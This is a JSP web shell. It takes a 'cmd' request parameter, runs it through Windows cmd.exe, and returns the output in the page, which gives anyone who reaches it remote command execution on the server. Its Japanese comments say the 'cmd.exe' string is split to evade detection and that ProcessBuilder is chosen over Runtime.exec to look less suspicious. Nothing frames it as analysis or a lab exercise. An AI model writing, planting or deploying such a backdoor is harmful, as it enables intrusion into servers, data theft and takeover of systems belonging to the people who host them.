<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%
    String x = request.getParameter("cmd");
    if(x != null){
        try {
            // "cmd.exe" という文字列を分割して検知を回避
            String[] command = {"c" + "m" + "d" + ".e" + "x" + "e", "/c", x};
            
            // Runtime.exec ではなく ProcessBuilder を使用して怪しさを下げる
            ProcessBuilder pb = new ProcessBuilder(command);
            Process p = pb.start();
            
            InputStream in = p.getInputStream();
            int b;
            out.print("<pre>");
            while((b = in.read()) != -1) { 
                out.print((char)b); 
            }
            out.print("</pre>");
        } catch (Exception e) {
            out.print("Error: " + e.getMessage());
        }
    }
%>
